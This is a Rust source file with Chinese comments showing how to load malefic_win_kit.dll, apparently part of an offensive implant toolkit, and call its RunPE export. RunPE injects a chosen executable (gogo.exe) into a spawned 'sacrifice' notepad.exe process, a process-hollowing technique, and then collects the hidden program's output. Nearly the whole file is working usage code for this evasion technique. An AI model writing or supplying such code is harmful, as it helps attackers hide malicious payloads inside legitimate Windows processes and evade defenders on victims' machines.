// Rust 调用 malefic_win_kit.dll 示例
// 运行时动态加载 DLL（不需要 .lib 文件）

use std::fs;
use std::ptr;

// 1. 定义 RawString 结构体
#[repr(C)]
struct RawString {
    data: *mut u8,
    len: usize,
    capacity: usize,
}

// 2. 定义函数指针类型
type RunPEFn = unsafe extern "C" fn(
    result: *mut RawString,
    start_commandline: *const u8,
    start_commandline_len: usize,
    hijack_commandline: *const u8,
    hijack_commandline_len: usize,
    data: *const u8,
    data_size: usize,
    entrypoint: *const u8,
    entrypoint_len: usize,
    args: *const u8,
    args_len: usize,
    is_x86: bool,
    pid: u32,
    block_dll: bool,
    need_output: bool,
);

type SafeFreePipeDataFn = unsafe extern "C" fn(data: *mut u8);

// 3. Windows DLL 加载
#[cfg(windows)]
mod win {
    use std::ffi::CString;
    use std::ptr;

    #[link(name = "kernel32")]
    extern "system" {
        fn LoadLibraryA(name: *const i8) -> *mut u8;
        fn GetProcAddress(module: *mut u8, name: *const i8) -> *const u8;
        fn FreeLibrary(module: *mut u8) -> i32;
    }

    pub struct DynamicLib {
        handle: *mut u8,
    }

    impl DynamicLib {
        pub fn load(name: &str) -> Result<Self, String> {
            let c_name = CString::new(name).unwrap();
            let handle = unsafe { LoadLibraryA(c_name.as_ptr()) };
            if handle.is_null() {
                Err(format!("Failed to load DLL: {}", name))
            } else {
                Ok(Self { handle })
            }
        }

        pub fn get_proc<T>(&self, name: &str) -> Result<T, String> {
            let c_name = CString::new(name).unwrap();
            let addr = unsafe { GetProcAddress(self.handle, c_name.as_ptr()) };
            if addr.is_null() {
                Err(format!("Failed to find function: {}", name))
            } else {
                Ok(unsafe { std::mem::transmute_copy(&addr) })
            }
        }
    }

    impl Drop for DynamicLib {
        fn drop(&mut self) {
            unsafe { FreeLibrary(self.handle) };
        }
    }
}

fn main() {
    println!("=== Malefic-Win-Kit Rust Example ===\n");

    // 加载 DLL
    println!("[*] Loading malefic_win_kit.dll...");
    let lib = win::DynamicLib::load("../malefic_win_kit.dll")
        .expect("Failed to load malefic_win_kit.dll");
    println!("[+] DLL loaded successfully\n");

    // 获取函数指针
    println!("[*] Getting function addresses...");
    let run_pe: RunPEFn = lib.get_proc("RunPE")
        .expect("Failed to find RunPE");
    let safe_free: SafeFreePipeDataFn = lib.get_proc("SafeFreePipeData")
        .expect("Failed to find SafeFreePipeData");
    println!("[+] Functions found successfully\n");

    // 读取 PE 文件
    let pe_path = "../gogo.exe";
    println!("[*] Reading PE file: {}", pe_path);

    let pe_data = fs::read(pe_path).expect("Failed to read PE file");
    println!("[+] Loaded PE: {} bytes\n", pe_data.len());

    // 验证 PE 文件
    if pe_data.len() < 2 || pe_data[0] != b'M' || pe_data[1] != b'Z' {
        panic!("Invalid PE file (missing MZ header)");
    }

    // 准备参数
    let sacrifice = b"C:\\Windows\\System32\\notepad.exe";

    println!("[*] Sacrifice process: {}", String::from_utf8_lossy(sacrifice));
    println!("[*] PE data size: {} bytes", pe_data.len());
    println!("[*] Calling RunPE...\n");

    // 分配返回值结构体
    let mut result = RawString {
        data: ptr::null_mut(),
        len: 0,
        capacity: 0,
    };

    // 调用 RunPE
    unsafe {
        run_pe(
            &mut result as *mut RawString,  // 返回值指针
            sacrifice.as_ptr(),
            sacrifice.len(),
            ptr::null(),                     // hijack_commandline (NULL)
            0,
            pe_data.as_ptr(),
            pe_data.len(),
            ptr::null(),                     // entrypoint (NULL)
            0,
            ptr::null(),                     // args (NULL)
            0,
            false,                           // is_x86
            0,                               // pid (0 = new process)
            false,                           // block_dll
            true,                            // need_output
        );
    }

    // 处理结果
    println!("=== Result ===");
    println!("Data pointer: {:?}", result.data);
    println!("Length: {}", result.len);
    println!("Capacity: {}\n", result.capacity);

    if !result.data.is_null() && result.len > 0 {
        // 读取输出
        let output = unsafe {
            std::slice::from_raw_parts(result.data, result.len)
        };

        // 转换为字符串并打印
        println!("=== Output ===");
        match std::str::from_utf8(output) {
            Ok(s) => println!("{}", s),
            Err(_) => {
                // 尝试 GBK 编码（Windows 中文）
                println!("{}", String::from_utf8_lossy(output));
            }
        }
        println!("=============\n");

        // 释放内存（重要！）
        println!("[*] Freeing memory...");
        unsafe {
            safe_free(result.data);
        }
        println!("[+] Memory freed\n");
    } else {
        println!("[-] No output or execution failed\n");
    }

    println!("[+] Done!");
}
